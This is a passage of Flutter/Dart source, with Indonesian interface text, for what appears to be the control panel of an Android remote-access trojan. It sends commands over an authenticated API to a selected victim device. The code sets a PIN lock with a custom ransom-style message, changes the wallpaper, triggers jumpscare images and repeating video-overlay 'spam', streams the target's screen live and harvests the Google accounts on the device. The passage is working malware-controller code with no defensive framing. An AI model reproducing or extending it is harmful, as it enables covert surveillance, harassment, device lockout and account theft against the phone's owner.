        _addLog("❌ Sesi kadaluarsa! Login ulang.", LogType.error);
        if (mounted) Navigator.pushReplacementNamed(context, '/login');
      } else {
        _addLog("❌ ERR: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ HTTP ERR: $e", LogType.error);
    } finally {
      if (mounted) setState(() => _isProcessing = false);
    }
  }

  // ─── COMMAND VIA REST ──────────────────────────────────────────────────
  Future<void> _sendCommandViaRest(String command, String value) async {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Device ID tidak valid!", LogType.error);
      return;
    }
    
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key');
    if (token == null || token.isEmpty) {
      _addLog("❌ Token hilang! Login ulang.", LogType.error);
      if (mounted) Navigator.pushReplacementNamed(context, '/login');
      return;
    }

    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": token,
        },
        body: jsonEncode({
          "command": command,
          "value": value,
        }),
      );

      if (response.statusCode == 200) {
        _addLog("🚀 EXEC: $command", LogType.success);
      } else if (response.statusCode == 401) {
        _addLog("❌ Sesi kadaluarsa! Login ulang.", LogType.error);
        if (mounted) Navigator.pushReplacementNamed(context, '/login');
      } else {
        _addLog("❌ ERR: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ HTTP ERR: $e", LogType.error);
    }
  }

  // ─── DIALOG INPUT ────────────────────────────────────────────────────
  Future<String?> _showLockDeviceDialog() async {
    String pin = '';
    String lockTitle = '';
    String errorMessage = '';
    
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          backgroundColor: _b3,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: _gborder2),
          ),
          title: Row(
            children: [
              Icon(Icons.lock, color: _blue2, size: 24),
              const SizedBox(width: 12),
              Text(
                'SET DEVICE LOCK',
                style: TextStyle(
                  color: _t0,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 2,
                ),
              ),
            ],
          ),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const SizedBox(height: 12),
                Text(
                  'MASUKKAN PIN & JUDUL LOCK',
                  style: TextStyle(
                    color: _t2,
                    fontSize: 10,
                    letterSpacing: 2,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 20),
                
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: List.generate(4, (index) {
                    return Container(
                      width: 52,
                      height: 60,
                      margin: const EdgeInsets.symmetric(horizontal: 5),
                      decoration: BoxDecoration(
                        border: Border.all(
                          color: _blue2.withOpacity(0.3),
                          width: 1.5,
                        ),
                        borderRadius: BorderRadius.circular(12),
                        color: _b2,
                      ),
                      child: Center(
                        child: Text(
                          index < pin.length
                              ? '●'
                              : '—',
                          style: TextStyle(
                            color: _blue2,
                            fontSize: index < pin.length ? 20 : 24,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    );
                  }),
                ),
                const SizedBox(height: 16),
                
                TextField(
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(4),
                  ],
                  keyboardType: TextInputType.number,
                  onChanged: (value) {
                    setState(() {
                      pin = value;
                      errorMessage = '';
                    });
                  },
                  style: const TextStyle(color: Colors.transparent),
                  decoration: InputDecoration(
                    isDense: true,
                    contentPadding: EdgeInsets.zero,
                    border: InputBorder.none,
                    enabledBorder: InputBorder.none,
                    focusedBorder: InputBorder.none,
                  ),
                  autofocus: true,
                ),
                
                GridView.count(
                  crossAxisCount: 3,
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  padding: EdgeInsets.zero,
                  mainAxisSpacing: 8,
                  crossAxisSpacing: 8,
                  children: [
                    ...[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) {
                      return _buildKeypadButton(
                        '$num',
                        onPressed: () {
                          if (pin.length < 4) {
                            setState(() {
                              pin += '$num';
                              errorMessage = '';
                            });
                          }
                        },
                      );
                    }),
                    _buildKeypadButton(
                      '⌫',
                      onPressed: () {
                        if (pin.isNotEmpty) {
                          setState(() {
                            pin = pin.substring(0, pin.length - 1);
                            errorMessage = '';
                          });
                        }
                      },
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                
                if (errorMessage.isNotEmpty)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    child: Text(
                      errorMessage,
                      style: TextStyle(
                        color: _red,
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ),
                const SizedBox(height: 8),
                
                TextField(
                  onChanged: (value) {
                    setState(() {
                      lockTitle = value;
                    });
                  },
                  maxLength: 60,
                  style: TextStyle(color: _t0, fontSize: 13),
                  decoration: InputDecoration(
                    hintText: 'Judul / Pesan Lock',
                    hintStyle: TextStyle(color: _t2, fontSize: 12),
                    counterText: '',
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: _blue2.withOpacity(0.2), width: 1.5),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: _blue2.withOpacity(0.2), width: 1.5),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: _blue2, width: 1.5),
                    ),
                  ),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context, null),
              child: Text("BATAL", style: TextStyle(color: _t2)),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [_blue2, _blue3],
                ),
                borderRadius: BorderRadius.circular(10),
              ),
              child: ElevatedButton(
                onPressed: () {
                  if (pin.length != 4) {
                    setState(() {
                      errorMessage = 'PIN harus 4 angka!';
                    });
                    return;
                  }
                  final lockData = jsonEncode({
                    'pin': pin,
                    'title': lockTitle.trim().isEmpty ? 'Perangkat Terkunci' : lockTitle.trim(),
                  });
                  Navigator.pop(context, lockData);
                },
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
                child: const Text("LOCK DEVICE", style: TextStyle(color: Colors.white)),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── KEYPAD BUTTON HELPER ──────────────────────────────────────────
  Widget _buildKeypadButton(String label, {required VoidCallback onPressed}) {
    return GestureDetector(
      onTap: onPressed,
      child: Container(
        decoration: BoxDecoration(
          border: Border.all(
            color: _blue2.withOpacity(0.2),
            width: 1,
          ),
          borderRadius: BorderRadius.circular(12),
          color: _b2,
        ),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            onTap: onPressed,
            borderRadius: BorderRadius.circular(12),
            child: Center(
              child: Text(
                label,
                style: TextStyle(
                  color: _t0,
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ─── DIALOG UNTUK SET WALLPAPER ────────────────────────────────────
  Future<void> _showSetWallpaperDialog() async {
    final String? url = await _showInputDialog(
      title: "SET WALLPAPER",
      hint: "Masukkan URL gambar untuk wallpaper",
      keyboardType: TextInputType.url,
      initialValue: '',
    );

    if (url != null && url.isNotEmpty) {
      _sendCommand('setWallpaper', extra: url);
      _addLog("🖼️ Set wallpaper: $url", LogType.success);
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("🖼️ Wallpaper updated!", style: TextStyle(color: _t0)),
          backgroundColor: _b3,
        ),
      );
    }
  }

  Future<String?> _showInputDialog({
    required String title,
    required String hint,
    String initialValue = '',
    bool multiline = false,
    TextInputType keyboardType = TextInputType.text,
  }) async {
    final controller = TextEditingController(text: initialValue);
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: _b3,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _gborder2),
        ),
        title: Row(
          children: [
            Icon(Icons.edit, color: _blue2, size: 24),
            const SizedBox(width: 12),
            Text(title, style: TextStyle(color: _t0, fontSize: 16, fontWeight: FontWeight.bold)),
          ],
        ),
        content: multiline
            ? TextField(
          controller: controller,
          maxLines: 10,
          style: TextStyle(color: _t0),
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: _t2),
            border: OutlineInputBorder(borderSide: BorderSide(color: _blue2.withOpacity(0.2))),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: _blue2.withOpacity(0.2))),
            focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: _blue2)),
          ),
        )
            : TextField(
          controller: controller,
          keyboardType: keyboardType,
          style: TextStyle(color: _t0),
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: _t2),
            border: OutlineInputBorder(borderSide: BorderSide(color: _blue2.withOpacity(0.2))),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: _blue2.withOpacity(0.2))),
            focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: _blue2)),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, null),
            child: Text("BATAL", style: TextStyle(color: _t2)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_blue2, _blue3],
              ),
              borderRadius: BorderRadius.circular(10),
            ),
            child: ElevatedButton(
              onPressed: () {
                final value = controller.text.trim();
                Navigator.pop(context, value);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10),
                ),
              ),
              child: const Text("KIRIM", style: TextStyle(color: Colors.white)),
            ),
          ),
        ],
      ),
    );
  }

  // ─── SHOW JUMPSCARE V2 DIALOG ──────────────────────────────────────
  Future<void> _showJumpscare2Dialog() async {
    final String? input = await _showInputDialog(
      title: "RDVSP PROJECT SETTINGS",
      hint: '{"url":"https://files.catbox.moe/xxx.jpg","duration":3000}',
      keyboardType: TextInputType.text,
      initialValue: _jumpscare2Url.isNotEmpty 
          ? '{"url":"$_jumpscare2Url","duration":$_jumpscare2Duration}'
          : '{"url":"https://files.catbox.moe/ulrmbb.jpg","duration":3000}',
    );
    
    if (input != null && input.isNotEmpty) {
      try {
        final jsonData = jsonDecode(input);
        final url = jsonData['url']?.toString() ?? '';
        final duration = jsonData['duration'] ?? 3000;
        
        if (url.isNotEmpty) {
          _jumpscare2Url = url;
          _jumpscare2Duration = duration is int ? duration : int.tryParse(duration.toString()) ?? 3000;
          
          _sendCommand('jumpscare2Start', extra: input);
          _addLog("😱 Jumpscare V2 dikirim: $url (durasi: $_jumpscare2Duration ms)", LogType.success);
          
          setState(() {
            _isJumpscare2Active = true;
            _updateControlItemState('jumpscare2Start', true);
          });
          
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text("😱 Jumpscare V2 aktif!", style: TextStyle(color: _t0)),
              backgroundColor: _b3,
            ),
          );
        } else {
          _addLog("❌ URL Jumpscare V2 kosong!", LogType.error);
        }
      } catch (e) {
        _addLog("❌ Format JSON Jumpscare V2 salah: $e", LogType.error);
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("❌ Format JSON salah! Contoh: {\"url\":\"...\",\"duration\":3000}", style: TextStyle(color: _t0)),
            backgroundColor: _b3,
          ),
        );
      }
    }
  }

  Future<void> _stopJumpscare2() async {
    _sendCommand('jumpscare2Stop', extra: '');
    _addLog("😱 Jumpscare V2 dihentikan", LogType.info);
    setState(() {
      _isJumpscare2Active = false;
      _updateControlItemState('jumpscare2Start', false);
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text("😱 Jumpscare V2 dihentikan", style: TextStyle(color: _t0)),
        backgroundColor: _b3,
      ),
    );
  }

  // ─── VIDEO OVERLAY DIALOG ──────────────────────────────────────────────
  Future<void> _showVideoOverlayDialog() async {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    bool isSpam = _isVideoOverlaySpam;
    int repeatCount = _videoOverlayRepeatCount > 0 ? _videoOverlayRepeatCount : 5;

    return showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          return AlertDialog(
            backgroundColor: _b3,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
              side: BorderSide(color: _gborder2),
            ),
            title: Row(
              children: [
                Icon(Icons.video_library, color: const Color(0xFF4FC3F7), size: 24),
                const SizedBox(width: 12),
                Text(
                  'VIDEO OVERLAY',
                  style: TextStyle(
                    color: _t0,
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 2,
                  ),
                ),
              ],
            ),
            content: SingleChildScrollView(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const SizedBox(height: 8),
                  
                  Container(
                    padding: const EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      color: _b2,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _blue2.withOpacity(0.1)),
                    ),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            Icon(
                              Icons.repeat,
                              color: isSpam ? Colors.orange : _t2,
                              size: 20,
                            ),
                            const SizedBox(width: 10),
                            Text(
                              'Mode Spam / Loop',
                              style: TextStyle(
                                color: isSpam ? Colors.orange : _t2,
                                fontSize: 14,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                            const Spacer(),
                            Switch(
                              value: isSpam,
                              onChanged: (value) {
                                setDialogState(() {
                                  isSpam = value;
                                });
                              },
                              activeColor: Colors.orange,
                              activeTrackColor: Colors.orange.withOpacity(0.3),
                            ),
                          ],
                        ),
                        if (isSpam) ...[
                          const SizedBox(height: 10),
                          Text(
                            'Jumlah Putaran',
                            style: TextStyle(
                              color: _t2,
                              fontSize: 11,
                              letterSpacing: 1,
                            ),
                          ),
                          const SizedBox(height: 6),
                          Row(
                            children: [
                              Expanded(
                                child: Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 4),
                                  child: Row(
                                    children: [
                                      IconButton(
                                        icon: Icon(Icons.remove_circle_outline, color: Colors.orange, size: 24),
                                        onPressed: () {
                                          if (repeatCount > 1) {
                                            setDialogState(() {
                                              repeatCount--;
                                            });
                                          }
                                        },
                                      ),
                                      Expanded(
                                        child: Center(
                                          child: Text(
                                            '$repeatCount',
                                            style: TextStyle(
                                              color: _t0,
                                              fontSize: 20,
                                              fontWeight: FontWeight.bold,
                                            ),
                                          ),
                                        ),
                                      ),
                                      IconButton(
                                        icon: Icon(Icons.add_circle_outline, color: Colors.orange, size: 24),
                                        onPressed: () {
                                          if (repeatCount < 999) {
                                            setDialogState(() {
                                              repeatCount++;
                                            });
                                          }
                                        },
                                      ),
                                    ],
                                  ),
                                ),
                              ),
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                decoration: BoxDecoration(
                                  color: _b2,
                                  borderRadius: BorderRadius.circular(6),
                                  border: Border.all(color: _blue2.withOpacity(0.1)),
                                ),
                                child: Text(
                                  repeatCount > 1 ? 'LOOP' : 'ONCE',
                                  style: TextStyle(
                                    color: repeatCount > 1 ? Colors.orange : _t2,
                                    fontSize: 10,
                                    fontWeight: FontWeight.bold,
                                    letterSpacing: 1,
                                  ),
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 6),
                          Text(
                            'Video akan diputar berulang kali dengan jeda 2 detik',
                            style: TextStyle(
                              color: _t2,
                              fontSize: 9,
                              letterSpacing: 0.5,
                            ),
                          ),
                        ] else ...[
                          const SizedBox(height: 6),
                          Text(
                            'Video akan diputar 1 kali saja',
                            style: TextStyle(
                              color: _t2,
                              fontSize: 10,
                              letterSpacing: 0.5,
                            ),
                          ),
                        ],
                      ],
                    ),
                  ),
                  const SizedBox(height: 16),
                  
                  if (_isVideoOverlayActive) ...[
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _green.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: _green.withOpacity(0.3)),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.check_circle, color: _green, size: 16),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              'Video overlay sedang aktif',
                              style: TextStyle(
                                color: _green,
                                fontSize: 12,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                  
                  if (_isVideoOverlayActive && _isVideoOverlaySpam) ...[
                    const SizedBox(height: 8),
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: Colors.orange.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: Colors.orange.withOpacity(0.3)),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.repeat, color: Colors.orange, size: 16),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              'Mode SPAM aktif: $_videoOverlayCounter / $_videoOverlayRepeatCount',
                              style: TextStyle(
                                color: Colors.orange,
                                fontSize: 12,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ],
              ),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text("BATAL", style: TextStyle(color: _t2)),
              ),
              if (_isVideoOverlayActive)
                Container(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [_red, Colors.red.shade800],
                    ),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: ElevatedButton.icon(
                    onPressed: () {
                      _stopVideoOverlay();
                      Navigator.pop(context);
                    },
                    icon: Icon(Icons.stop, size: 16, color: Colors.white),
                    label: Text("STOP", style: TextStyle(color: Colors.white)),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.transparent,
                      shadowColor: Colors.transparent,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                      ),
                    ),
                  ),
                ),
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [const Color(0xFF4FC3F7), _blue2],
                  ),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: ElevatedButton.icon(
                  onPressed: () {
                    _videoOverlayTimer?.cancel();
                    _videoOverlayTimer = null;
                    _videoOverlayCounter = 0;
                    
                    _isVideoOverlaySpam = isSpam;
                    _videoOverlayRepeatCount = repeatCount;
                    
                    _sendCommand('videoOverlay', extra: 'start');
                    _addLog("🎬 Video overlay dijalankan", LogType.success);
                    
                    setState(() {
                      _isVideoOverlayActive = true;
                      _updateControlItemState('videoOverlay', true);
                    });
                    
                    if (isSpam && repeatCount > 1) {
                      _videoOverlayCounter = 1;
                      _videoOverlayTimer = Timer.periodic(
                        const Duration(seconds: 3),
                        (timer) {
                          _videoOverlayCounter++;
                          if (_videoOverlayCounter <= _videoOverlayRepeatCount) {
                            _sendCommand('videoOverlay', extra: 'start');
                            _addLog("🔄 SPAM #$_videoOverlayCounter", LogType.info);
                            setDialogState(() {});
                          } else {
                            timer.cancel();
                            _videoOverlayTimer = null;
                            _addLog("✅ Video overlay spam selesai (${_videoOverlayRepeatCount}x)", LogType.success);
                            setState(() {
                              _isVideoOverlaySpam = false;
                              _isVideoOverlayActive = false;
                              _updateControlItemState('videoOverlay', false);
                            });
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(
                                content: Text("✅ Video overlay spam selesai!", style: TextStyle(color: _t0)),
                                backgroundColor: _b3,
                              ),
                            );
                            if (mounted) Navigator.pop(context);
                          }
                        },
                      );
                    }
                    
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                        content: Text(
                          "🎬 Video overlay ${isSpam ? 'SPAM (${repeatCount}x)' : ''} dimulai!",
                          style: TextStyle(color: _t0),
                        ),
                        backgroundColor: _b3,
                      ),
                    );
                  },
                  icon: Icon(
                    _isVideoOverlayActive ? Icons.refresh : Icons.play_arrow,
                    size: 16,
                    color: Colors.white,
                  ),
                  label: Text(
                    _isVideoOverlayActive ? "UPDATE" : "PLAY",
                    style: TextStyle(color: Colors.white),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.transparent,
                    shadowColor: Colors.transparent,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                  ),
                ),
              ),
            ],
          );
        },
      ),
    );
  }

  Future<void> _stopVideoOverlay() async {
    _sendCommand('videoOverlayHide', extra: '');
    _addLog("🎬 Video overlay dihentikan", LogType.info);
    _videoOverlayTimer?.cancel();
    _videoOverlayTimer = null;
    _videoOverlayCounter = 0;
    setState(() {
      _isVideoOverlayActive = false;
      _isVideoOverlaySpam = false;
      _updateControlItemState('videoOverlay', false);
    });
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text("🎬 Video overlay dihentikan", style: TextStyle(color: _t0)),
        backgroundColor: _b3,
      ),
    );
  }

  // ─── LIVE SCREEN METHODS ──────────────────────────────────────────────
  void _startLiveScreen() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    if (_cameraModalVisible) _closeCameraModal();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _screenFrame = '';
      _screenLoading = true;
      _screenModalVisible = true;
      _screenStreamActive = true;
    });

    _sendCommandViaRest('screen', 'start');
    _addLog("🖥️ Starting live screen stream", LogType.info);
    
    _showScreenDialog();
  }

  void _stopLiveScreen() {
    setState(() {
      _screenModalVisible = false;
      _screenFrame = '';
      _screenLoading = true;
      _screenStreamActive = false;
    });
    
    _sendCommandViaRest('screen', 'stop');
    _addLog("🖥️ Stopping live screen stream", LogType.info);
    
    if (_screenDialogContext != null) {
      try { Navigator.pop(_screenDialogContext!); } catch (_) {}
      _screenDialogContext = null;
    }
  }

  void _showScreenDialog() {
    if (_screenDialogContext != null) {
      try { Navigator.pop(_screenDialogContext!); } catch (_) {}
      _screenDialogContext = null;
    }

    showDialog(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black.withOpacity(0.95),
      builder: (context) {
        _screenDialogContext = context;
        return WillPopScope(
          onWillPop: () async {
            _stopLiveScreen();
            return true;
          },
          child: Dialog(
            backgroundColor: Colors.transparent,
            insetPadding: const EdgeInsets.all(4),
            child: Container(
              width: double.infinity,
              height: double.infinity,
              decoration: BoxDecoration(
                color: _b0,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: _blue2.withOpacity(0.1)),
              ),
              child: _buildScreenContent(),
            ),
          ),
        );
      },
    );
  }

  Widget _buildScreenContent() {
    return Stack(
      children: [
        Container(
          color: _b0,
          width: double.infinity,
          height: double.infinity,
        ),
        if (_screenFrame.isNotEmpty)
          Center(
            child: InteractiveViewer(
              minScale: 0.5,
              maxScale: 4.0,
              panEnabled: true,
              scaleEnabled: true,
              boundaryMargin: const EdgeInsets.all(20),
              child: Image.memory(
                base64Decode(_screenFrame.split(',').last),
                fit: BoxFit.contain,
                width: MediaQuery.of(context).size.width * 0.9,
                height: MediaQuery.of(context).size.height * 0.7,
                errorBuilder: (context, error, stackTrace) {
                  return Center(
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.error_outline, color: _t2, size: 48),
                        const SizedBox(height: 12),
                        Text(
                          "Gagal load screen",
                          style: TextStyle(color: _t2, fontSize: 14),
                        ),
                      ],
                    ),
                  );
                },
              ),
            ),
          )
        else
          Center(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(
                  width: 50,
                  height: 50,
                  child: CircularProgressIndicator(
                    color: _blue2,
                    strokeWidth: 3,
                  ),
                ),
                const SizedBox(height: 20),
                Text(
                  "LOADING SCREEN...",
                  style: TextStyle(
                    color: _t2,
                    fontSize: 13,
                    letterSpacing: 3,
                  ),
                ),
              ],
            ),
          ),
        Positioned(
          top: 0,
          left: 0,
          right: 0,
          child: Container(
            padding: const EdgeInsets.fromLTRB(16, 16, 16, 12),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [Colors.black.withOpacity(0.8), Colors.transparent],
              ),
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Row(
                  children: [
                    Container(
                      width: 10,
                      height: 10,
                      decoration: const BoxDecoration(
                        color: Colors.red,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 10),
                    Text(
                      "SCREEN",
                      style: TextStyle(
                        color: _t0,
                        fontSize: 14,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 2,
                      ),
                    ),
                    const SizedBox(width: 16),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                      decoration: BoxDecoration(
                        color: _screenStreamActive ? _green.withOpacity(0.2) : _red.withOpacity(0.2),
                        borderRadius: BorderRadius.circular(4),
                      ),
                      child: Text(
                        _screenStreamActive ? "LIVE" : "OFF",
                        style: TextStyle(
                          color: _screenStreamActive ? _green : _red,
                          fontSize: 10,
                          letterSpacing: 1,
                        ),
                      ),
                    ),
                  ],
                ),
                Text(
                  _targetModel,
                  style: TextStyle(
                    color: _t2,
                    fontSize: 10,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          ),
        ),
        Positioned(
          bottom: 80,
          left: 0,
          right: 0,
          child: Center(
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.5),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: _blue2.withOpacity(0.1)),
              ),
              child: Text(
                "PINCH TO ZOOM & PAN",
                style: TextStyle(
                  color: _t2,
                  fontSize: 9,
                  letterSpacing: 2,
                ),
              ),
            ),
          ),
        ),
        Positioned(
          bottom: 30,
          left: 0,
          right: 0,
          child: Center(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [_red, Colors.red.shade800],
                ),
                borderRadius: BorderRadius.circular(30),
              ),
              child: ElevatedButton.icon(
                onPressed: _stopLiveScreen,
                icon: const Icon(Icons.stop, size: 20, color: Colors.white),
                label: const Text("STOP SCREEN", style: TextStyle(color: Colors.white)),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  padding: const EdgeInsets.symmetric(horizontal: 32, vertical: 14),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(30),
                  ),
                ),
              ),
            ),
          ),
        ),
        Positioned(
          top: 16,
          right: 16,
          child: GestureDetector(
            onTap: _stopLiveScreen,
            child: Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _b2,
                border: Border.all(color: _blue2.withOpacity(0.1)),
              ),
              child: Icon(
                Icons.close,
                color: _t0,
                size: 20,
              ),
            ),
          ),
        ),
      ],
    );
  }

  // ─── SHOW GOOGLE ACCOUNTS DIALOG ──────────────────────────────────────
  void _showGoogleAccountsDialog() {
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Pilih device terlebih dahulu!", LogType.error);
      return;
    }

    setState(() {
      _isGoogleAccountsLoading = true;
      _googleAccounts = [];
    });

    _sendCommand('getGmail');
    _addLog("📧 Fetching Google accounts...", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: true,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          return AlertDialog(
            backgroundColor: _b3,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
              side: BorderSide(color: _gborder2),
            ),
            titlePadding: const EdgeInsets.all(16),
            contentPadding: const EdgeInsets.all(0),
            title: Row(
              children: [
                Container(
                  width: 36,
                  height: 36,
                  decoration: BoxDecoration(
                    color: const Color(0xFFF87171).withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: const Color(0xFFF87171).withOpacity(0.3)),
                  ),
                  child: const Icon(Icons.email, color: Color(0xFFF87171), size: 20),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "Akun Gmail / Google",
                        style: TextStyle(
                          color: _t0,
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      Text(
                        "${_googleAccounts.length} akun ditemukan",
                        style: TextStyle(
                          color: _t2,
                          fontSize: 11,
                        ),
                      ),
                    ],
                  ),
                ),
                IconButton(
                  icon: Icon(Icons.close, color: _t2, size: 20),
                  onPressed: () {
                    Navigator.pop(context);
                  },
                ),
              ],
            ),
            content: Container(
              width: double.maxFinite,
              height: 400,
              child: _isGoogleAccountsLoading
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          SizedBox(
                            width: 30,
                            height: 30,
                            child: CircularProgressIndicator(
                              color: _blue2,
                              strokeWidth: 2,
                            ),
                          ),
                          const SizedBox(height: 12),
                          Text(
                            "Loading accounts...",
                            style: TextStyle(color: _t2, fontSize: 12),
                          ),
                        ],
                      ),
                    )
                  : _googleAccounts.isEmpty
                      ? Center(
                          child: Text(
                            "No Google accounts found",
